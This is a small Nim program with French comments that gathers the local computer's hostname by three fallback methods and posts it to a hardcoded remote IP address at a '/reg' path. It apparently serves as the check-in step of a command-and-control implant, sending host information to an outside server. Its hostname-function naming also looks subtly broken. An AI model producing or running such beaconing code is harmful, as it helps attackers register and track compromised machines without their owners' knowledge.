import std/envvars
import std/nativesockets
import winim/lean
import httpclient

# Je ne savais pas lequel prendre alors je l'ai ai tous mis
# avec std/envvars
proc getHostnameEnvVars(): string =
  result = getEnv("COMPUTERNAME", getEnv("HOSTNAME", "unknown"))

# avec std/nativesockets
proc getHostnameNativeSockets(): string =
  try:
    result = getHostname()
  except:
    result = "unknown"

# avec winim/lean
proc getHostnameWin(): string =
  var computerName: array[MAX_COMPUTERNAME_LENGTH + 1, CHAR]
  var size = computerName.len.DWORD
  if GetComputerNameA(computerName[0].addr, size.addr) != 0:
    return $computerName
  else:
    return "unknown"

proc getHostname(): string =
  # Essayons plusieurs méthodes
  result = getHostnameEnvVars()
  if result == "unknown":
    result = getHostnameNativeSockets()
  if result == "unknown":
    result = getHostnameWin()

proc main() =
  var client = newHttpClient()
  let url = "http://159.65.208.238/reg"
  
  let hostname = getHostname()
  
  let payload = "name=" & hostname
  
  client.headers = newHttpHeaders({
    "Content-Type": "application/x-www-form-urlencoded"
  })
  
  try:
    let response = client.post(url, payload)
    echo "Status code: ", response.status
    echo "Response body: ", response.body
    echo "Hostname used: ", hostname
  except:
    echo "Erreur lors de l'envoi de la requête : ", getCurrentExceptionMsg()

main()